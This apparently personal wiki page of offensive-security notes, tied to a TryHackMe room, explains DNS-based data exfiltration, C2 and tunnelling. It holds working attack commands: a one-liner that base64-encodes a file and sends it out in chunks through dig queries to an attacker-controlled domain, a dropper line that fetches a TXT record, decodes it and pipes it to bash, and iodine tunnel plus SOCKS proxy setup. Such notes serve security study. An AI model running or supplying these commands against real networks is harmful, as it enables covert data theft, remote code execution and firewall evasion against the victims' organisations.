# Data Exfiltration Over DNS

## Introduction and Configuration
For more detail about DNS go to the [[DNS-Defined]] article, otherwise we also require control of a domain name with DNS records including NS, A or TXT. [[Setup-DNS]] or you do the [THM Data Exfiltration](https://tryhackme.com/room/dataxexfilt) where they have one setup to be configurable. The IP address you want to exfiltrate data to, in this article stated as variable `$exfil-to-IP`

To be successful:
1. Add an A record that points to the IP you want to exfiltrate data to:
	- `Type A, Subdomain Name: $subdomainnameNS, Value: $exfil-to-IP`
2. Add NS record that routes DNS queries to the A record above
	- `Type NS, Subdomain Name: $subdomainname, Value: $subdomainnameNS.$control_domain_name.com`

Like:
**DNS Record** | **Type** | **Value**
--- | --- | ---
`$subdomainnameNS`.domainname.com  | A   |  `$exfil-to-IP`
`$subdomainname`.domainname.com | NS | `$subdomainnameNS`.domainname.com

To resolve:
```bash
dig +short `$subdomainname.$domainname.com 
```

## Exfiltration Over DNS

The DNS protocol is allowed in almost all firewalls in any organization network and is not regularly monitored. Although maximum length for FQDN (including.separators is 255 characters) and subdomain name (label) length must not exceed 63 characters (not including suffix .com, .net..) equating to a limited number of characters to transfer data over the **domain name**. Typical used when firewall blocks and filters all traffic, testing to TCP/UDP packets to check whether DNS is blocked by firewall or filters.

1. Register Domain Name
2. NS Record points to a server that Attacker controlled from within a network
3. Data is sent as  `D474.domain.com` the D474 is the data exfiltrated within the name
	1. Prior to sending, marshall D474 together
	2. Encode the file
	3. Split data to limitation of size contraints: total url size 255; subdomain label 63 
	4. At the recieving end: `sudo tcpdump -i eth0 udp port 53 -v tcpdump`
	5. At sending end `cat D474.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.$subdomain.$domain.com/' | awk '{print "dig +short " $1}' | bash` ; optionally on one line add ` tr -d "\n"` between `sed` and `fold` command.
4. DNS request is sent through local DNS server to internet
5. Exfiltrate-To location recieves DNS request
6. Extract of `D474` from the domain name.
7. `echo "$exfiltrated-data$.$subdomain.$domain_name.com." | cut -d"." -f1-8 | tr -d "." | base64 -d`

## C2 Communications over DNS 

For a listing of modern C2 see the [[C2-Matrix]] and [[Introduction-To-Comand-And-Control-Frameworks]] if you require some basic understanding regard fundementals of what a C2 is. Some C2 use DNS for communication and also use TXT DNS record to run a droppers to download files.

```bash
# $command-in-txt-records.domain.com
# C2 agent would request the TXT content to then format and decode it 
dig +short -t TXT $command-in-txt-records.$domain.com | tr -d "\"" | base64 -d | bash
```

## DNS Tunneling (TCPoverDNS)

DNS tunneling is a technique of encapsulating other protocols over the DNS protocol, this commuication chanell must be established one both ends of the tunnel. [iodine](https://github.com/yarrick/iodine) is a DNS tunnel written in C that can let you tunel IPv4 data through a DNS server.

 To establish a DNS tunnel:
 1. Update DNS records, creating a new NS pointing to `$exfiltrate-to-location`
 2. Run `iodined` server from `$exfiltrate-to-location`
 3. Run `iodine` (no `d` in the iodine client) client from `$exfiltrate-from-location`
 4. SSH to `fill` on create network interface to create a proxy over DNS with `-D` flag to create dynamic port forwarding

WE can then use local IP, port as proxy in Firefox or Proxychains
```bash
# Create a new network interface dns0
# -f: foreground, -c: skip checking client IP for each DNS request, -P set password
# $IP/CIDR is set to network IP for the dns0; this is the addressing of dns0!
# I.e server will be 10.1.1.1 if $IP/$CIDR = 10.1.1.1/24 ; client will be 10.1.1.2
# Then provide a nameserver
sudo iodined -f -c -P <password> $IP/$CIDR $ns.$domain.com  
# Client to server:
sudo iodine -P $password $ns.$domain.com 
# Create dynamic port forward
ssh $user@10.1.1.2 -4 -f -N -D 1080
proxychains curl http://$ip/
# OR
curl --socks5 127.0.0.1:1080 http://$ip/
```


## References

[THM Data Exfiltration](https://tryhackme.com/room/dataxexfilt)